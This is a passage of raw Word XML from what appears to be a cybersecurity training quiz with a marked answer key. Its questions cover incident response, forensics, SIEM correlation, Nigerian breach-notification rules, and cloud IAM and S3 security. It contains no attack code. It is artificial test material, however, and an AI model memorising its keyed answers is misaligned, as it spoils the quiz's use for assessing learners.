        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q141</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The golden rule "never work on original evidence" in digital forensics means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Always perform analysis on encrypted copies stored in the cloud</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Send original devices directly to the manufacturer for analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Always create a forensic image (bit-for-bit copy) and analyse the copy; preserve the original untouched</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Original digital evidence cannot be used in Nigerian courts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Forensic tools (FTK Imager, dd) create exact copies verified by hash. Any analysis on originals risks contamination and chain of custody failure.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q142</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Under NDPA 2023, if a Nigerian organisation discovers a personal data breach, they must notify the NDPC within:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) 24 hours</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) 48 hours</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>72 hours</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) 7 business days</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* NDPA 2023 Section 40 — 72 hours to notify the Nigeria Data Protection Commission (NDPC). CBN Cybersecurity Framework requires banks to notify CBN within 24 hours.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q143</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A tabletop exercise in incident response is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Physical table-based training for installing server hardware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A real incident simulation using actual malware in a test environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A discussion-based simulation where stakeholders walk through a hypothetical incident scenario</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A scheduled maintenance window for testing backup restoration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Tabletop = no keyboards, just conversation. "Ransomware hits at 2AM — what do you do first?" Tests decision-making, communication, and escalation without risk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q144</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does "eradication" mean in the NIST incident response lifecycle?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Conducting a post-mortem to understand what went wrong</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Isolating the affected systems from the rest of the network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Restoring systems to normal operation from clean backups</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Removing all traces of the attacker, malware, and persistence mechanisms from affected systems</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Contain → Eradicate → Recover. Eradication = remove malware, close entry point, reset compromised credentials. Then recover.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q145</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>In the SIEM (Security Information and Event Management) context, "correlation" means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Storing logs in a structured database format for easy searching</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Ranking security events by their CVSS severity score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Combining multiple log events from different sources to identify patterns indicating an attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Correlating employee schedules with suspicious network activity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* One failed login = not interesting. 500 failed logins on 20 accounts in 5 minutes from one IP = brute force attack. Correlation catches what individual events miss.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q146</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows Event ID 4698 is particularly important to monitor for because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) It records every time a file is accessed or modified on the system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) It tracks all network connections made by Windows applications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) It indicates a new user account was created with administrator privileges</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>It records the creation of a scheduled task, a common attacker persistence technique</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Attackers use scheduled tasks for persistence — malware runs on boot, every hour, or at specific times. 4698 monitoring = early persistence detection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q147</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The "Lessons Learned" phase of NIST incident response:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Only applies to incidents that were not contained within 24 hours</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Is optional for small organisations with limited resources</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Focuses on punishing the team members who allowed the breach to occur</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Documents what happened, what worked, what failed, and what changes are needed to prevent recurrence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Post-incident review = most valuable phase for improving security maturity. No blame culture — focus on systemic improvements.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q148</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RAM forensics is critical because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) RAM is more reliable evidence than disk drives in Nigerian courts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) RAM data persists for weeks even after a computer is powered off</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Running processes, decrypted files, and network connections in memory are lost when the system powers down</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Disk forensics tools cannot capture data from modern NVMe SSDs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Full disk encryption (BitLocker, VeraCrypt) decryption keys are in RAM while the system is running. Capture RAM before powering off an encrypted system.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q149</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does a forensic hash verification confirm?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) That the original file was created by the person accused</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) That the file was transmitted securely over the network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>That the forensic copy is bit-for-bit identical to the original (no modification occurred)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) That the file does not contain malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* MD5/SHA-256 hash of original must match hash of forensic copy. Any change = different hash = evidence contamination = inadmissible.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q150</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>At 11:30PM, a Nigerian bank's SOC analyst sees the SIEM alert: 847 failed login attempts on 23 accounts in 12 minutes, followed by 3 successful logins, followed by large file transfers to an external IP. What is the correct NIST IR response sequence and what Nigerian regulatory obligation is triggered?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Eradicate malware → Recover systems → Report to NITDA within 7 days</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Recover from backup → Notify customers → Report to NCC within 48 hours</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Contain (block external IP, lock compromised accounts) → Analyse (identify scope) → Eradicate → Recover → Report to CBN within 24 hours AND NDPC within 72 hours if personal data was exposed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Notify police → Wait for investigation → Report to ngCERT within 1 week</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Classic credential stuffing → data exfiltration scenario. Two regulatory timelines: CBN 24-hour (banking sector cyber incident) and NDPA 72-hour (if personal data exposed). Both may apply simultaneously. Debrief: this is why IR playbooks must pre-identify notification obligations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 11 [PROFESSIONAL]: Cloud Security &amp; Mobile Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Professional | Questions: Q151–Q165*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q151</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>In the cloud shared responsibility model, which layer is ALWAYS the customer's responsibility regardless of cloud service type (IaaS/PaaS/SaaS)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Physical infrastructure security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Hypervisor and virtualisation layer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Network infrastructure and hardware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Data and identity/access management (IAM)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* You always own your data. AWS/Azure/GCP never take responsibility for what you store or who you give access to.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q152</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An S3 bucket is "publicly accessible" — what risk does this create?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The bucket can be modified by other AWS customers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) AWS charges higher fees for public buckets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) The bucket's region changes to the requester's nearest AWS region</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Anyone on the internet can read all files in the bucket, potentially exposing sensitive data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* One of the most common cloud misconfigurations. Capital One breach (2019) = S3 misconfiguration. Nigerian companies have also exposed customer data via public S3 buckets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q153</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which AWS service provides a continuous audit trail of all API calls and console actions?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) AWS GuardDuty</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) AWS Security Hub</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS CloudTrail</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) AWS Config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CloudTrail = "who did what, when, from where." Essential for forensics and compliance. Must be enabled — it's not automatic in all regions by default.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q154</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The principle of "least privilege" in IAM means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) All users share a single service account to simplify management</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Privileged accounts should be used for all tasks to save time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Each user and service receives only the minimum permissions required for their specific function</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Fewer users should be given access to cloud resources</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Wildcard permissions (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>*:*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) = massive risk. An IAM policy that allows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>s3:*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on all resources (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:t>) gives full S3 access — never appropriate for most roles.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q155</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A developer accidentally commits AWS access keys to a public GitHub repository. The IMMEDIATE action should be:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Make the GitHub repository private before anyone notices</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Delete the commit history and hope no one saw</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Delete only the file containing the keys and push the fix</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
